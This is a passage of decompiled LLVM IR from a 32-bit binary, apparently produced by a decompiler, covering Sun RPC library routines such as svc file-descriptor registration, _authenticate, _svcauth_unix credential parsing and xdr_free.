  store i32 %v3_8056b86, i32* %eax.global-to-local, align 4
  %v1_8056b8c = add i32 %v0_8056b7e, -1023
  %v6_8056b8c = sub i32 1022, %v0_8056b7e
  %v7_8056b8c = and i32 %v6_8056b8c, %v0_8056b7e
  %v8_8056b8c = icmp slt i32 %v7_8056b8c, 0
  %v9_8056b8c = icmp eq i32 %v1_8056b8c, 0
  %v10_8056b8c = icmp slt i32 %v1_8056b8c, 0
  %v0_8056b92 = load i32, i32* @esi, align 4
  %v3_8056b92 = mul i32 %v0_8056b7e, 4
  %v4_8056b92 = add i32 %v3_8056b86, %v3_8056b92
  %v5_8056b92 = inttoptr i32 %v4_8056b92 to i32*
  store i32 %v0_8056b92, i32* %v5_8056b92, align 4
  %v3_8056b95 = icmp eq i1 %v10_8056b8c, %v8_8056b8c
  %v4_8056b95 = icmp eq i1 %v9_8056b8c, false
  %v5_8056b95 = and i1 %v4_8056b95, %v3_8056b95
  br i1 %v5_8056b95, label %dec_label_pc_8056baa, label %dec_label_pc_8056b97

dec_label_pc_8056b97:                             ; preds = %dec_label_pc_8056b86
  %v0_8056b97 = call i32 @__GI___rpc_thread_svc_fdset()
  store i32 %v0_8056b97, i32* %eax.global-to-local, align 4
  %v0_8056b9c = load i32, i32* @edi, align 4
  %v2_8056ba0 = udiv i32 %v0_8056b9c, 32
  store i32 %v2_8056ba0, i32* @ecx, align 4
  %v1_8056ba3 = urem i32 %v0_8056b9c, 32
  store i32 %v1_8056ba3, i32* %edx.global-to-local, align 4
  %v2_8056ba6 = mul nuw nsw i32 %v2_8056ba0, 4
  %v3_8056ba6 = add i32 %v2_8056ba6, %v0_8056b97
  %v4_8056ba6 = inttoptr i32 %v3_8056ba6 to i32*
  %v5_8056ba6 = load i32, i32* %v4_8056ba6, align 4
  %v8_8056ba6 = shl i32 1, %v1_8056ba3
  %v11_8056ba6 = or i32 %v5_8056ba6, %v8_8056ba6
  store i32 %v11_8056ba6, i32* %v4_8056ba6, align 4
  br label %dec_label_pc_8056baa

dec_label_pc_8056baa:                             ; preds = %dec_label_pc_8056b86, %dec_label_pc_8056b97
  br label %dec_label_pc_8056bd1

dec_label_pc_8056bae:                             ; preds = %dec_label_pc_8056bd1
  %v0_8056bae = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_8056bae, i32* %eax.global-to-local, align 4
  %v0_8056bb3 = load i32, i32* @ebx, align 4
  %v1_8056bb3 = mul i32 %v0_8056bb3, 8
  store i32 %v1_8056bb3, i32* @ecx, align 4
  store i32 %v1_8056bb3, i32* %edx.global-to-local, align 4
  %v2_8056bbc = inttoptr i32 %v0_8056bae to i32*
  %v3_8056bbc = load i32, i32* %v2_8056bbc, align 4
  %v4_8056bbc = add i32 %v3_8056bbc, %v1_8056bb3
  store i32 %v4_8056bbc, i32* %edx.global-to-local, align 4
  %v1_8056bbe = inttoptr i32 %v4_8056bbc to i32*
  %v2_8056bbe = load i32, i32* %v1_8056bbe, align 4
  %v12_8056bbe = icmp eq i32 %v2_8056bbe, -1
  %v1_8056bc1 = icmp eq i1 %v12_8056bbe, false
  br i1 %v1_8056bc1, label %dec_label_pc_8056bd0, label %dec_label_pc_8056bc3

dec_label_pc_8056bc3:                             ; preds = %dec_label_pc_8056bae
  %v0_8056bc3 = load i32, i32* @edi, align 4
  store i32 %v0_8056bc3, i32* %v1_8056bbe, align 4
  %v2_8056bc5 = load i32, i32* %v2_8056bbc, align 4
  store i32 %v2_8056bc5, i32* %eax.global-to-local, align 4
  %v1_8056bc7 = load i32, i32* @ecx, align 4
  %v2_8056bc7 = add i32 %v2_8056bc5, 4
  %v3_8056bc7 = add i32 %v2_8056bc7, %v1_8056bc7
  %v4_8056bc7 = inttoptr i32 %v3_8056bc7 to i16*
  store i16 195, i16* %v4_8056bc7, align 2
  br label %dec_label_pc_8056c13

dec_label_pc_8056bd0:                             ; preds = %dec_label_pc_8056bae
  %v1_8056bd0 = add i32 %v0_8056bb3, 1
  br label %dec_label_pc_8056bd1

dec_label_pc_8056bd1:                             ; preds = %dec_label_pc_8056baa, %dec_label_pc_8056bd0
  %storemerge = phi i32 [ 0, %dec_label_pc_8056baa ], [ %v1_8056bd0, %dec_label_pc_8056bd0 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_8056bd1 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_8056bd1, i32* %eax.global-to-local, align 4
  store i32 %v0_8056bd1, i32* @esi, align 4
  %v1_8056bd8 = inttoptr i32 %v0_8056bd1 to i32*
  %v2_8056bd8 = load i32, i32* %v1_8056bd8, align 4
  store i32 %v2_8056bd8, i32* %eax.global-to-local, align 4
  %v0_8056bda = load i32, i32* @ebx, align 4
  %v5_8056bdc = icmp slt i32 %v0_8056bda, %v2_8056bd8
  br i1 %v5_8056bdc, label %dec_label_pc_8056bae, label %dec_label_pc_8056bde

dec_label_pc_8056bde:                             ; preds = %dec_label_pc_8056bd1
  %v1_8056bde = add i32 %v2_8056bd8, 1
  store i32 %v1_8056bde, i32* %eax.global-to-local, align 4
  store i32 %v1_8056bde, i32* %v1_8056bd8, align 4
  %v0_8056be1 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_8056be1, i32* %eax.global-to-local, align 4
  store i32 %v0_8056be1, i32* @ebx, align 4
  %v0_8056bea = load i32, i32* @esi, align 4
  %v1_8056bea = inttoptr i32 %v0_8056bea to i32*
  %v2_8056bea = load i32, i32* %v1_8056bea, align 4
  %v2_8056bec = mul i32 %v2_8056bea, 8
  store i32 %v2_8056bec, i32* %eax.global-to-local, align 4
  store i32 %v2_8056bec, i32* %stack_var_-24, align 4
  %v1_8056bf0 = inttoptr i32 %v0_8056be1 to i32*
  %v2_8056bf0 = load i32, i32* %v1_8056bf0, align 4
  store i32 %v2_8056bf0, i32* %stack_var_-28, align 4
  %v4_8056bf2 = inttoptr i32 %v2_8056bf0 to i32*
  %v5_8056bf2 = call i32 @realloc(i32* %v4_8056bf2, i32 %v2_8056bec, i32 %v0_8056be1, i32 %v0_8056be1)
  store i32 %v5_8056bf2, i32* %eax.global-to-local, align 4
  %v1_8056bfa = icmp eq i32 %v5_8056bf2, 0
  store i32 %v5_8056bf2, i32* %edx.global-to-local, align 4
  %v1_8056bfe = load i32, i32* @ebx, align 4
  %v2_8056bfe = inttoptr i32 %v1_8056bfe to i32*
  store i32 %v5_8056bf2, i32* %v2_8056bfe, align 4
  br i1 %v1_8056bfa, label %dec_label_pc_8056c13, label %dec_label_pc_8056c02

dec_label_pc_8056c02:                             ; preds = %dec_label_pc_8056bde
  %v0_8056c02 = load i32, i32* @esi, align 4
  %v1_8056c02 = inttoptr i32 %v0_8056c02 to i32*
  %v2_8056c02 = load i32, i32* %v1_8056c02, align 4
  store i32 %v2_8056c02, i32* %eax.global-to-local, align 4
  %v0_8056c04 = load i32, i32* @edi, align 4
  %v1_8056c04 = load i32, i32* %edx.global-to-local, align 4
  %v3_8056c04 = mul i32 %v2_8056c02, 8
  %v4_8056c04 = add i32 %v3_8056c04, -8
  %v5_8056c04 = add i32 %v4_8056c04, %v1_8056c04
  %v6_8056c04 = inttoptr i32 %v5_8056c04 to i32*
  store i32 %v0_8056c04, i32* %v6_8056c04, align 4
  %v0_8056c08 = load i32, i32* @esi, align 4
  %v1_8056c08 = inttoptr i32 %v0_8056c08 to i32*
  %v2_8056c08 = load i32, i32* %v1_8056c08, align 4
  store i32 %v2_8056c08, i32* %edx.global-to-local, align 4
  %v0_8056c0a = load i32, i32* @ebx, align 4
  %v1_8056c0a = inttoptr i32 %v0_8056c0a to i32*
  %v2_8056c0a = load i32, i32* %v1_8056c0a, align 4
  store i32 %v2_8056c0a, i32* %eax.global-to-local, align 4
  %v2_8056c0c = mul i32 %v2_8056c08, 8
  %v3_8056c0c = add i32 %v2_8056c0c, -4
  %v4_8056c0c = add i32 %v3_8056c0c, %v2_8056c0a
  %v5_8056c0c = inttoptr i32 %v4_8056c0c to i16*
  store i16 195, i16* %v5_8056c0c, align 2
  br label %dec_label_pc_8056c13

dec_label_pc_8056c13:                             ; preds = %dec_label_pc_8056b79, %dec_label_pc_8056bde, %dec_label_pc_8056b57, %dec_label_pc_8056bc3, %dec_label_pc_8056c02
  %v0_8056c16 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056c16

; uselistorder directives
  uselistorder i32 %v5_8056bf2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8056bec, { 2, 1, 0 }
  uselistorder i32 %v1_8056ba3, { 1, 0 }
  uselistorder i32 %v2_8056ba0, { 1, 0 }
  uselistorder i32 %v0_8056b9c, { 1, 0 }
  uselistorder i32 %v1_8056b8c, { 1, 0 }
  uselistorder i32 %v0_8056b7e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8056b5f, { 2, 1, 0 }
  uselistorder i32* %stack_var_-24, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 13, 0, 1, 2, 3, 7, 4, 8, 5, 6, 9, 10, 11, 12, 14, 15, 16 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1022, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8056c13, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_8056bd1, { 1, 0 }
  uselistorder label %dec_label_pc_8056baa, { 1, 0 }
}

define i32 @_authenticate() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8056c19 = load i32, i32* @ebx, align 4
  store i32 %v0_8056c19, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @esi, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v1_8056c27 = add i32 %tmp1, 24
  %v1_8056c2a = add i32 %tmp, 12
  %v3_8056c2f = inttoptr i32 %v1_8056c2a to i16*
  %v4_8056c2f = call i32 @memcpy(i16* %v3_8056c2f, i32 %v1_8056c27, i32 12)
  %v1_8056c34 = add i32 %tmp, 28
  %v2_8056c34 = inttoptr i32 %v1_8056c34 to i32*
  %v3_8056c34 = load i32, i32* %v2_8056c34, align 4
  %v0_8056c3a = load i32, i32* @global_var_8067e20.297, align 32
  %v2_8056c3f = add i32 %v3_8056c34, 32
  %v3_8056c3f = inttoptr i32 %v2_8056c3f to i32*
  store i32 %v0_8056c3a, i32* %v3_8056c3f, align 4
  %v0_8056c42 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c42 = add i32 %v0_8056c42, 28
  %v2_8056c42 = inttoptr i32 %v1_8056c42 to i32*
  %v3_8056c42 = load i32, i32* %v2_8056c42, align 4
  %v1_8056c45 = add i32 %v3_8056c42, 40
  %v2_8056c45 = inttoptr i32 %v1_8056c45 to i32*
  store i32 0, i32* %v2_8056c45, align 4
  %v0_8056c4c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056c4c = add i32 %v0_8056c4c, 12
  %v2_8056c4c = inttoptr i32 %v1_8056c4c to i32*
  %v3_8056c4c = load i32, i32* %v2_8056c4c, align 4
  %v1_8056c58 = mul i32 %v3_8056c4c, 4
  %v2_8056c58 = add i32 %v1_8056c58, ptrtoint (i32* @global_var_805cef8.307 to i32)
  %v3_8056c58 = inttoptr i32 %v2_8056c58 to i32*
  %v4_8056c58 = load i32, i32* %v3_8056c58, align 4
  %v2_8056c64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056c64, i32* %ebx.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_8056c58)
  %v2_8056c68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056c68, i32* @edx, align 4
  store i32 %v2_8056c64, i32* @ebx, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32 %tmp1, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056c7b = load i32, i32* @edi, align 4
  %v0_8056c7d = load i32, i32* @ebx, align 4
  store i32 %v0_8056c7d, i32* %stack_var_-16, align 4
  %v1_8056c85 = add i32 %arg2, 24
  %v2_8056c85 = inttoptr i32 %v1_8056c85 to i32*
  %v3_8056c85 = load i32, i32* %v2_8056c85, align 4
  store i32 %v3_8056c85, i32* @edi, align 4
  %v1_8056c88 = add i32 %v3_8056c85, 24
  %v2_8056c8b = add i32 %v3_8056c85, 4
  %v3_8056c8b = inttoptr i32 %v2_8056c8b to i32*
  store i32 %v1_8056c88, i32* %v3_8056c8b, align 4
  %v0_8056c8e = load i32, i32* @edi, align 4
  %v1_8056c8e = add i32 %v0_8056c8e, 280
  %v2_8056c94 = add i32 %v0_8056c8e, 20
  %v3_8056c94 = inttoptr i32 %v2_8056c94 to i32*
  store i32 %v1_8056c8e, i32* %v3_8056c94, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_8056c9b = add i32 %arg3, 32
  %v2_8056c9b = inttoptr i32 %v1_8056c9b to i32*
  %v3_8056c9b = load i32, i32* %v2_8056c9b, align 4
  store i32 %v3_8056c9b, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_8056ca9 = add i32 %arg3, 28
  %v2_8056ca9 = inttoptr i32 %v1_8056ca9 to i32*
  %v3_8056ca9 = load i32, i32* %v2_8056ca9, align 4
  %v2_8056cac = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8056cac, i32* @ebx, align 4
  %v5_8056cb1 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v3_8056ca9, i32 %v3_8056c9b, i32 1)
  store i32 %v2_8056cac, i32* @esi, align 4
  store i32 %v3_8056ca9, i32* @ebp, align 4
  store i32 %tmp7, i32* @eax, align 4
  %v7_8056cc1 = add i32 %tmp7, 24
  %v8_8056cc1 = inttoptr i32 %v7_8056cc1 to i32*
  %v9_8056cc1 = load i32, i32* %v8_8056cc1, align 4
  call void @__pseudo_call(i32 %v9_8056cc1)
  %v1_8056cc7 = icmp eq i32 %tmp7, 0
  store i32 %tmp7, i32* %edx.global-to-local, align 4
  br i1 %v1_8056cc7, label %dec_label_pc_8056d5e, label %dec_label_pc_8056cd1

dec_label_pc_8056cd1:                             ; preds = %entry
  %v1_8056cd1 = inttoptr i32 %tmp7 to i32*
  %v2_8056cd1 = load i32, i32* %v1_8056cd1, align 4
  %v1_8056cd3 = call i32 @llvm.bswap.i32(i32 %v2_8056cd1)
  %v1_8056cd5 = load i32, i32* @edi, align 4
  %v2_8056cd5 = inttoptr i32 %v1_8056cd5 to i32*
  store i32 %v1_8056cd3, i32* %v2_8056cd5, align 4
  %v0_8056cd7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056cd7 = add i32 %v0_8056cd7, 4
  %v2_8056cd7 = inttoptr i32 %v1_8056cd7 to i32*
  %v3_8056cd7 = load i32, i32* %v2_8056cd7, align 4
  %v1_8056cda = call i32 @llvm.bswap.i32(i32 %v3_8056cd7)
  store i32 %v1_8056cda, i32* @esi, align 4
  %v6_8056ce2 = icmp ugt i32 %v1_8056cda, 255
  br i1 %v6_8056ce2, label %dec_label_pc_8056ddb, label %dec_label_pc_8056ce8

dec_label_pc_8056ce8:                             ; preds = %dec_label_pc_8056cd1
  %v1_8056cea = add i32 %v0_8056cd7, 8
  store i32 %v1_8056cea, i32* %ebx.global-to-local, align 4
  %v0_8056cee = load i32, i32* @edi, align 4
  %v1_8056cee = add i32 %v0_8056cee, 4
  %v2_8056cee = inttoptr i32 %v1_8056cee to i32*
  %v3_8056cee = load i32, i32* %v2_8056cee, align 4
  %v1_8056cf1 = add i32 %v1_8056cda, 3
  %v1_8056cf4 = and i32 %v1_8056cf1, -4
  store i32 %v1_8056cf4, i32* %ebp.global-to-local, align 4
  %tmp25 = inttoptr i32 %v3_8056cee to i16*
  %v5_8056cf7 = call i32 @memcpy(i16* %tmp25, i32 %v1_8056cea, i32 %v1_8056cda)
  %v0_8056cfc = load i32, i32* @edi, align 4
  %v1_8056cfc = add i32 %v0_8056cfc, 4
  %v2_8056cfc = inttoptr i32 %v1_8056cfc to i32*
  %v3_8056cfc = load i32, i32* %v2_8056cfc, align 4
  %v0_8056cff = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056cff = load i32, i32* %ebp.global-to-local, align 4
  %v2_8056cff = add i32 %v1_8056cff, %v0_8056cff
  store i32 %v2_8056cff, i32* %edx.global-to-local, align 4
  %v2_8056d05 = add i32 %v3_8056cfc, %v1_8056cda
  %v3_8056d05 = inttoptr i32 %v2_8056d05 to i8*
  store i8 0, i8* %v3_8056d05, align 1
  %v0_8056d09 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056d09 = inttoptr i32 %v0_8056d09 to i32*
  %v2_8056d09 = load i32, i32* %v1_8056d09, align 4
  %v1_8056d0b = call i32 @llvm.bswap.i32(i32 %v2_8056d09)
  %v1_8056d0d = load i32, i32* @edi, align 4
  %v2_8056d0d = add i32 %v1_8056d0d, 8
  %v3_8056d0d = inttoptr i32 %v2_8056d0d to i32*
  store i32 %v1_8056d0b, i32* %v3_8056d0d, align 4
  %v0_8056d10 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056d10 = add i32 %v0_8056d10, 4
  %v2_8056d10 = inttoptr i32 %v1_8056d10 to i32*
  %v3_8056d10 = load i32, i32* %v2_8056d10, align 4
  %v1_8056d13 = call i32 @llvm.bswap.i32(i32 %v3_8056d10)
  %v1_8056d15 = load i32, i32* @edi, align 4
  %v2_8056d15 = add i32 %v1_8056d15, 12
  %v3_8056d15 = inttoptr i32 %v2_8056d15 to i32*
  store i32 %v1_8056d13, i32* %v3_8056d15, align 4
  %v0_8056d18 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056d18 = add i32 %v0_8056d18, 8
  %v2_8056d18 = inttoptr i32 %v1_8056d18 to i32*
  %v3_8056d18 = load i32, i32* %v2_8056d18, align 4
  %v1_8056d1b = call i32 @llvm.bswap.i32(i32 %v3_8056d18)
  store i32 %v1_8056d1b, i32* %ecx.global-to-local, align 4
  %v6_8056d20 = icmp ugt i32 %v1_8056d1b, 16
  br i1 %v6_8056d20, label %dec_label_pc_8056ddb, label %dec_label_pc_8056d26

dec_label_pc_8056d26:                             ; preds = %dec_label_pc_8056ce8
  %v1_8056d26 = add i32 %v0_8056d18, 12
  store i32 %v1_8056d26, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_8056d2b = load i32, i32* @edi, align 4
  %v2_8056d2b = add i32 %v1_8056d2b, 16
  %v3_8056d2b = inttoptr i32 %v2_8056d2b to i32*
  store i32 %v1_8056d1b, i32* %v3_8056d2b, align 4
  %v0_8056d3e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8056d3e28 = icmp ult i32 %v0_8056d3e.pre, %v1_8056d1b
  br i1 %v7_8056d3e28, label %dec_label_pc_8056d30, label %dec_label_pc_8056d42

dec_label_pc_8056d30:                             ; preds = %dec_label_pc_8056d26, %dec_label_pc_8056d30
  %v2_8056d3a29 = phi i32 [ %v1_8056d3d, %dec_label_pc_8056d30 ], [ %v0_8056d3e.pre, %dec_label_pc_8056d26 ]
  %v0_8056d30 = load i32, i32* @edi, align 4
  %v1_8056d30 = add i32 %v0_8056d30, 20
  %v2_8056d30 = inttoptr i32 %v1_8056d30 to i32*
  %v3_8056d30 = load i32, i32* %v2_8056d30, align 4
  store i32 %v3_8056d30, i32* %edx.global-to-local, align 4
  %v0_8056d33 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056d33 = inttoptr i32 %v0_8056d33 to i32*
  %v2_8056d33 = load i32, i32* %v1_8056d33, align 4
  %v1_8056d35 = add i32 %v0_8056d33, 4
  store i32 %v1_8056d35, i32* %ebx.global-to-local, align 4
  %v1_8056d38 = call i32 @llvm.bswap.i32(i32 %v2_8056d33)
  %v3_8056d3a = mul i32 %v2_8056d3a29, 4
  %v4_8056d3a = add i32 %v3_8056d30, %v3_8056d3a
  %v5_8056d3a = inttoptr i32 %v4_8056d3a to i32*
  store i32 %v1_8056d38, i32* %v5_8056d3a, align 4
  %v0_8056d3d = load i32, i32* %esi.global-to-local, align 4
  %v1_8056d3d = add i32 %v0_8056d3d, 1
  store i32 %v1_8056d3d, i32* %esi.global-to-local, align 4
  %v7_8056d3e = icmp ult i32 %v1_8056d3d, %v1_8056d1b
  br i1 %v7_8056d3e, label %dec_label_pc_8056d30, label %dec_label_pc_8056d42

dec_label_pc_8056d42:                             ; preds = %dec_label_pc_8056d30, %dec_label_pc_8056d26
  %v0_8056d42 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8056d42 = mul i32 %v1_8056d1b, 4
  %v3_8056d42 = add i32 %v2_8056d42, 20
  %v4_8056d42 = add i32 %v3_8056d42, %v0_8056d42
  %tmp = icmp ugt i32 %v4_8056d42, %tmp6
  br i1 %tmp, label %dec_label_pc_8056d4c, label %dec_label_pc_8056d89

dec_label_pc_8056d4c:                             ; preds = %dec_label_pc_8056d42
  %v6_8056d57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_805cf04.308, i32 0, i32 0), i32 %v1_8056d1b, i32 %v0_8056d42, i32 %tmp6)
  br label %dec_label_pc_8056d7f

dec_label_pc_8056d5e:                             ; preds = %entry
  %v0_8056d60 = load i32, i32* @edi, align 4
  %v6_8056d62 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8056d60, i32 0, i32 0)
  store i32 %v6_8056d62, i32* @eax, align 4
  %v1_8056d6a = icmp eq i32 %v6_8056d62, 0
  %v1_8056d6c = icmp eq i1 %v1_8056d6a, false
  br i1 %v1_8056d6c, label %dec_label_pc_8056d89, label %dec_label_pc_8056d6e

dec_label_pc_8056d6e:                             ; preds = %dec_label_pc_8056d5e
  %v0_8056d78 = load i32, i32* @edi, align 4
  %v6_8056d7a = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8056d78, i32 %v6_8056d62, i32 %v6_8056d62)
  br label %dec_label_pc_8056d7f

dec_label_pc_8056d7f:                             ; preds = %dec_label_pc_8056d4c, %dec_label_pc_8056d6e
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056de0

dec_label_pc_8056d89:                             ; preds = %dec_label_pc_8056d42, %dec_label_pc_8056d5e
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8056d91 = add i32 %arg2, 44
  %v2_8056d91 = inttoptr i32 %v1_8056d91 to i32*
  %v3_8056d91 = load i32, i32* %v2_8056d91, align 4
  %v4_8056d91 = icmp eq i32 %v3_8056d91, 0
  %v1_8056d95 = add i32 %arg1, 28
  %v2_8056d95 = inttoptr i32 %v1_8056d95 to i32*
  %v3_8056d95 = load i32, i32* %v2_8056d95, align 4
  store i32 %v3_8056d95, i32* %edx.global-to-local, align 4
  br i1 %v4_8056d91, label %dec_label_pc_8056dc2, label %dec_label_pc_8056d9a

dec_label_pc_8056d9a:                             ; preds = %dec_label_pc_8056d89
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v1_8056d9c = add i32 %arg2, 36
  %v2_8056d9c = inttoptr i32 %v1_8056d9c to i32*
  %v3_8056d9c = load i32, i32* %v2_8056d9c, align 4
  %v2_8056d9f = add i32 %v3_8056d95, 32
  %v3_8056d9f = inttoptr i32 %v2_8056d9f to i32*
  store i32 %v3_8056d9c, i32* %v3_8056d9f, align 4
  %v3_8056da6 = load i32, i32* %v2_8056d95, align 4
  store i32 %v3_8056da6, i32* %edx.global-to-local, align 4
  %v0_8056da9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056da9 = add i32 %v0_8056da9, 40
  %v2_8056da9 = inttoptr i32 %v1_8056da9 to i32*
  %v3_8056da9 = load i32, i32* %v2_8056da9, align 4
  %v2_8056dac = add i32 %v3_8056da6, 36
  %v3_8056dac = inttoptr i32 %v2_8056dac to i32*
  store i32 %v3_8056da9, i32* %v3_8056dac, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v3_8056db3 = load i32, i32* %v2_8056d95, align 4
  store i32 %v3_8056db3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v3_8056dba = load i32, i32* %v2_8056d91, align 4
  %v2_8056dbd = add i32 %v3_8056db3, 40
  %v3_8056dbd = inttoptr i32 %v2_8056dbd to i32*
  store i32 %v3_8056dba, i32* %v3_8056dbd, align 4
  br label %dec_label_pc_8056dd7

dec_label_pc_8056dc2:                             ; preds = %dec_label_pc_8056d89
  %v1_8056dc2 = add i32 %v3_8056d95, 32
  %v2_8056dc2 = inttoptr i32 %v1_8056dc2 to i32*
  store i32 0, i32* %v2_8056dc2, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v3_8056dcd = load i32, i32* %v2_8056d95, align 4
  %v1_8056dd0 = add i32 %v3_8056dcd, 40
  %v2_8056dd0 = inttoptr i32 %v1_8056dd0 to i32*
  store i32 0, i32* %v2_8056dd0, align 4
  br label %dec_label_pc_8056dd7

dec_label_pc_8056dd7:                             ; preds = %dec_label_pc_8056d9a, %dec_label_pc_8056dc2
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056de0

dec_label_pc_8056ddb:                             ; preds = %dec_label_pc_8056ce8, %dec_label_pc_8056cd1
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056de0

dec_label_pc_8056de0:                             ; preds = %dec_label_pc_8056dd7, %dec_label_pc_8056d7f, %dec_label_pc_8056ddb
  %v0_8056dfb5 = phi i32 [ 0, %dec_label_pc_8056dd7 ], [ 1, %dec_label_pc_8056d7f ], [ 1, %dec_label_pc_8056ddb ]
  %v3_8056de0 = load i32, i32* %stack_var_-40, align 4
  %v1_8056de4 = add i32 %v3_8056de0, 28
  %v2_8056de4 = inttoptr i32 %v1_8056de4 to i32*
  %v3_8056de4 = load i32, i32* %v2_8056de4, align 4
  store i32 %v3_8056de4, i32* %edx.global-to-local, align 4
  %v1_8056de7 = icmp eq i32 %v3_8056de4, 0
  br i1 %v1_8056de7, label %dec_label_pc_8056df8, label %dec_label_pc_8056deb

dec_label_pc_8056deb:                             ; preds = %dec_label_pc_8056de0
  call void @__pseudo_call(i32 %v3_8056de4)
  %v0_8056dfb.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056df8

dec_label_pc_8056df8:                             ; preds = %dec_label_pc_8056de0, %dec_label_pc_8056deb
  %v0_8056dfb = phi i32 [ %v0_8056dfb.pre, %dec_label_pc_8056deb ], [ %v0_8056dfb5, %dec_label_pc_8056de0 ]
  %v2_8056dfe = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056dfe, i32* %esi.global-to-local, align 4
  store i32 %v0_8056c7b, i32* %ebp.global-to-local, align 4
  ret i32 %v0_8056dfb

; uselistorder directives
  uselistorder i32 %v3_8056d95, { 1, 0, 2 }
  uselistorder i32* %v2_8056d95, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8056d3d, { 1, 2, 0 }
  uselistorder i32 %v1_8056d1b, { 2, 4, 1, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-40, { 3, 0, 1, 2, 4 }
  uselistorder i32 %tmp7, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8056df8, { 1, 0 }
  uselistorder label %dec_label_pc_8056de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056dd7, { 1, 0 }
  uselistorder label %dec_label_pc_8056d89, { 1, 0 }
  uselistorder label %dec_label_pc_8056d7f, { 1, 0 }
  uselistorder label %dec_label_pc_8056d30, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 2, i32* %stack_var_-24, align 4
  %v2_8056e13 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8056e18 = call i32 @unknown_0(i32 %v2_8056e13)
  ret i32 %v1_8056e18

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 4, 3, 2, 1, 0 }
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
